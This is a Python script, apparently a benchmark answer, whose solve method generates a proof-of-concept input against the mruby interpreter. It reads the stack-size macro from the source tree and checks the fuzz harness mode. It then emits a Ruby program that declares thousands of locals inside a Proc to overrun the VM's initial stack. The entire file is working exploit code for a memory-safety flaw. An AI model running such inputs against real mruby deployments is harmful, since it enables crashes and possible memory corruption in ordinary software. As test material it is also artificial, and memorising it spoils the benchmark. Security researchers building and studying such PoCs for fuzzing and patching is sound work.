import os
import re
import tarfile
from typing import Iterator, Optional


def _iter_text_files_from_dir(root: str, exts: tuple[str, ...], max_size: int) -> Iterator[tuple[str, str]]:
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if not fn.lower().endswith(exts):
                continue
            p = os.path.join(dirpath, fn)
            try:
                st = os.stat(p)
            except OSError:
                continue
            if st.st_size <= 0 or st.st_size > max_size:
                continue
            try:
                with open(p, "rb") as f:
                    data = f.read()
            except OSError:
                continue
            yield p, data.decode("utf-8", errors="ignore")


def _iter_text_files_from_tar(tar_path: str, exts: tuple[str, ...], max_size: int) -> Iterator[tuple[str, str]]:
    try:
        tf = tarfile.open(tar_path, "r:*")
    except Exception:
        return
    with tf:
        for m in tf.getmembers():
            if not m.isreg():
                continue
            name = m.name
            if not name.lower().endswith(exts):
                continue
            if m.size <= 0 or m.size > max_size:
                continue
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
            except Exception:
                continue
            yield name, data.decode("utf-8", errors="ignore")


def _iter_text_files(src_path: str, exts: tuple[str, ...], max_size: int = 1_000_000) -> Iterator[tuple[str, str]]:
    if os.path.isdir(src_path):
        yield from _iter_text_files_from_dir(src_path, exts, max_size)
    else:
        yield from _iter_text_files_from_tar(src_path, exts, max_size)


def _parse_int_macro(src_path: str, macro: str) -> Optional[int]:
    pat = re.compile(r"^\s*#\s*define\s+" + re.escape(macro) + r"\s+\(?\s*(\d+)\s*\)?\s*(?:$|/[*]|//)", re.M)
    for _, txt in _iter_text_files(src_path, (".h", ".c", ".cc", ".cpp", ".hpp", ".inc", ".inl"), max_size=2_000_000):
        m = pat.search(txt)
        if m:
            try:
                return int(m.group(1))
            except Exception:
                pass
    return None


def _detect_input_mode(src_path: str) -> str:
    mode = "unknown"
    for _, txt in _iter_text_files(src_path, (".c", ".cc", ".cpp", ".h", ".hpp"), max_size=2_000_000):
        if "LLVMFuzzerTestOneInput" not in txt and "fuzz" not in _.lower():
            continue
        if re.search(r"\bmrb_(read|load)_irep\b", txt) or "RITE" in txt:
            mode = "irep"
        if re.search(r"\bmrb_load_nstring\b", txt) or re.search(r"\bmrb_parse_nstring\b", txt) or re.search(r"\bmrb_load_string\b", txt):
            return "ruby"
    return mode


def _varname_excel(i: int) -> str:
    i += 1
    s = []
    while i > 0:
        i -= 1
        s.append(chr(ord("a") + (i % 26)))
        i //= 26
    return "".join(reversed(s))


def _build_ruby_poc(stack_init: int) -> bytes:
    local_count = max(stack_init * 2, stack_init + 1024)
    if local_count < 512:
        local_count = 512
    if local_count > 20000:
        local_count = 20000

    names = [_varname_excel(i) for i in range(local_count)]
    chunk = 256
    stmts = []
    for i in range(0, len(names), chunk):
        part = names[i:i + chunk]
        stmts.append(",".join(part) + "=0")
    assigns = ";".join(stmts)

    code = "p=Proc.new do;if false;" + assigns + ";end;end;p.call\n"
    return code.encode("utf-8", errors="strict")


class Solution:
    def solve(self, src_path: str) -> bytes:
        stack_init = _parse_int_macro(src_path, "MRB_STACK_INIT_SIZE")
        if stack_init is None:
            stack_init = _parse_int_macro(src_path, "MRB_STACK_INIT_SIZE_DEFAULT")
        if stack_init is None:
            stack_init = 1024

        mode = _detect_input_mode(src_path)
        # If mode appears to be irep-only, still return Ruby source; many harnesses use detect/load that accepts source.
        _ = mode

        return _build_ruby_poc(stack_init)